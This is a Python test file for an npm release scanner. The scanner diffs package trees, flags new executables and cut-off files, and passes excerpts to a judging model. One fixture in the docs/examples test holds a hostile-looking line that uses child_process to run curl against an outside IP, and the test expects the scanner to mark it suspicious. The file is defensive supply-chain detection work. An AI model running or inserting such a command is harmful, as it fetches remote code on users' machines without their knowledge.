"""Scout reads new text files. Synthetic trees only. Nothing here is executed."""

from pathlib import Path

from hunter.archives import describe_binary, executable_header_name
from hunter.classify import classify_files
from hunter.head import load_head
from hunter.jev import pack_chunks
from hunter.jev_tokens import state_tokens
from hunter.models import ReleaseMeta
from hunter.triage import (
    NEW_FILE_CUT_MARKER,
    NEW_TEXT_FILE_BYTES,
    categorize,
    changed_file_manifest,
    diff_trees,
    is_noise,
    new_text_file_diffs,
)
from hunter.fake_jev import KeywordJev


def _meta() -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem="npm",
        name="widget",
        old_version="1.0.0",
        new_version="1.0.1",
        rank=4,
        registry_url="https://example.test/widget",
    )


def _ordinary() -> str:
    return "function add(a, b) {\n  return a + b;\n}\nmodule.exports = add;\n"


def _marker(extension: str, header: str = "none", kind: str = "binary") -> str:
    return (
        "[binary-or-media-file]\n"
        f"kind: {kind}\n"
        "bytes: 16\n"
        "sha256_prefix: abc\n"
        f"extension: {extension}\n"
        f"header: {header}\n"
    )


def test_every_scout_state_lists_changed_files_and_a_quiet_new_file_is_sent():
    old = {"index.js": _ordinary()}
    new = {**old, "lib/quiet.js": "function helper() {\n  return 1;\n}\n"}
    jev = KeywordJev()
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
    assert jev.calls
    for call in jev.calls:
        listed = call["state"].get("changed_files") or ""
        assert listed.startswith("[changed_files]\n")
        assert "lib/quiet.js" in listed
    assert any("function helper()" in call["state"].get("diff_excerpt", "") for call in jev.calls)
    assert result.band == "benign"
    assert "partial_read" not in result.signals


def test_a_new_text_file_over_16_kib_is_split_by_the_token_counter_when_it_fits():
    body = "const n = 1;\n" + ("A" * 8000)
    assert len(body.encode("utf-8")) <= NEW_TEXT_FILE_BYTES
    extra, cut = new_text_file_diffs({}, {"lib/quiet.js": body}, [])
    assert cut is False
    assert extra[0].category == "new_file"
    manifest = changed_file_manifest({}, {"lib/quiet.js": body})
    chunks = pack_chunks(extra, _meta(), budget=2_000, changed_files=manifest)
    assert len(chunks) > 1
    joined = "".join(state["diff_excerpt"] for state in chunks)
    assert "const n = 1" in joined
    assert "AAAA" in joined
    assert NEW_FILE_CUT_MARKER not in joined
    for state in chunks:
        assert state_tokens(state) <= 2_000
        assert "lib/quiet.js" in (state.get("changed_files") or "")


def test_a_long_changed_file_list_is_split_and_a_huge_line_is_marked_cut():
    lines = [f"added dropped path/file_{index}.js (no suspicious pattern)" for index in range(80)]
    manifest = "[changed_files]\n" + "\n".join(lines)
    chunks = pack_chunks([], _meta(), budget=400, changed_files=manifest)
    joined = "\n".join(state.get("changed_files") or "" for state in chunks)
    assert "file_0.js" in joined
    assert "file_79.js" in joined
    assert NEW_FILE_CUT_MARKER not in joined
    for state in chunks:
        assert state_tokens(state) <= 400

    huge = "z" * 20_000
    cut_chunks = pack_chunks([], _meta(), budget=300, changed_files=huge)
    assert any(NEW_FILE_CUT_MARKER in (state.get("changed_files") or "") for state in cut_chunks)
    for state in cut_chunks:
        assert state_tokens(state) <= 300


def test_a_new_text_file_past_16_kib_is_sent_cut_and_flagged_partial():
    body = "exports.value = 1;\n" + ("x" * (NEW_TEXT_FILE_BYTES + 50))
    extra, cut = new_text_file_diffs({}, {"lib/quiet.js": body}, [])
    assert cut is True
    assert NEW_FILE_CUT_MARKER in extra[0].new_text
    assert len(extra[0].new_text.encode("utf-8")) <= NEW_TEXT_FILE_BYTES + len(NEW_FILE_CUT_MARKER.encode("utf-8"))
    jev = KeywordJev()
    old = {"index.js": _ordinary()}
    new = {**old, "lib/quiet.js": body}
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
    assert jev.calls
    sent = "".join(call["state"].get("diff_excerpt") or "" for call in jev.calls)
    assert "exports.value = 1" in sent
    assert "partial_read" in result.signals
    assert result.band == "review"


def test_code_under_docs_and_examples_is_kept():
    assert is_noise("docs/demo.js") is False
    assert is_noise("examples/demo.py") is False
    assert is_noise("doc/run.ts") is False
    assert is_noise("example/tool.sh") is False
    assert is_noise("docs/guide.md") is True
    hostile = "require('child_process').execSync('curl http://203.0.113.9/x');\n"
    assert categorize("docs/demo.js", hostile, hostile, True) == "suspicious_source"
    quiet_js = "function helper() {\n  return 1;\n}\n"
    quiet_py = "def helper():\n    return 1\n"
    trees = {
        "docs/demo.js": quiet_js,
        "examples/demo.py": quiet_py,
        "docs/guide.md": "hello\n",
    }
    kept = diff_trees({}, trees)
    extra, cut = new_text_file_diffs({}, trees, kept)
    assert cut is False
    sent = {item.path for item in extra}
    assert sent == {"docs/demo.js", "examples/demo.py"}
    manifest = changed_file_manifest({}, trees)
    assert "added included docs/demo.js (new_file)" in manifest
    assert "added included examples/demo.py (new_file)" in manifest
    assert "added dropped docs/guide.md (docs)" in manifest


def test_an_extensionless_shebang_file_is_a_script():
    body = "#!/bin/sh\necho ok\n"
    diffs = diff_trees({}, {"scripts/setup": body})
    assert [item.category for item in diffs] == ["entry_points"]
    jev = KeywordJev()
    result = classify_files(
        meta=_meta(),
        old_files={"index.js": _ordinary()},
        new_files={"index.js": _ordinary(), "scripts/setup": body},
        jev=jev,
        head=load_head(),
    )
    sent = "".join(call["state"].get("diff_excerpt") or "" for call in jev.calls)
    assert "#!/bin/sh" in sent
    assert any("scripts/setup" in (call["state"].get("changed_files") or "") for call in jev.calls)
    assert result.band == "benign"


def test_a_new_executable_is_flagged_without_a_model_call():
    old = {"index.js": _ordinary(), "package.json": '{"name":"widget","version":"1.0.0"}\n'}
    new = {**old, "build/addon.node": _marker(".node", "elf")}
    jev = KeywordJev()
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
    assert jev.calls == []
    assert "new_binary" in result.signals
    assert result.band == "review"
    assert result.needs_llm_review is True


def test_a_native_rebuild_may_add_an_executable():
    old = {"index.js": _ordinary(), "package.json": '{"name":"widget","version":"1.0.0"}\n'}
    new = {
        "index.js": _ordinary(),
        "package.json": '{"name":"widget","version":"1.0.1","scripts":{"install":"node-gyp-build"}}\n',
        "build/addon.node": _marker(".node", "elf"),
    }
    jev = KeywordJev()
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
    assert "new_binary" not in result.signals
    assert result.band == "benign"


def test_elf_pe_and_mach_o_headers_count_and_an_existing_binary_does_not():
    assert executable_header_name(b"\x7fELF\x02\x01") == "elf"
    assert executable_header_name(b"MZ\x90\x00") == "pe"
    assert executable_header_name(b"\xfe\xed\xfa\xce\x00\x00") == "mach-o"
    assert executable_header_name(b"hello") == ""
    described = describe_binary(Path("addon.node"), b"\x7fELF\x00rest", 20)
    assert "header: elf" in described

    old = {"index.js": _ordinary()}
    elf = {**old, "payload.dat": _marker(".dat", "elf")}
    flagged = classify_files(meta=_meta(), old_files=old, new_files=elf, jev=KeywordJev(), head=load_head())
    assert "new_binary" in flagged.signals
    assert flagged.band == "review"

    already = {**old, "vendor/old.so": _marker(".so", "elf")}
    again = {**already, "vendor/new.so": _marker(".so", "elf")}
    repeat = classify_files(meta=_meta(), old_files=already, new_files=again, jev=KeywordJev(), head=load_head())
    assert "new_binary" not in repeat.signals

    media = {**old, "assets/logo.png": _marker(".png", "none", kind="media")}
    picture = classify_files(meta=_meta(), old_files=old, new_files=media, jev=KeywordJev(), head=load_head())
    assert "new_binary" not in picture.signals


def test_a_new_executable_with_a_version_bump_is_not_cleared_at_the_quick_check():
    old = {"index.js": _ordinary(), "package.json": '{"name":"widget","version":"1.0.0"}\n'}
    new = {
        "index.js": _ordinary(),
        "package.json": '{"name":"widget","version":"1.0.1"}\n',
        "build/addon.node": _marker(".node", "elf"),
    }
    jev = KeywordJev()
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
    assert "new_binary" in result.signals
    assert "pass_a_gate" not in result.signals
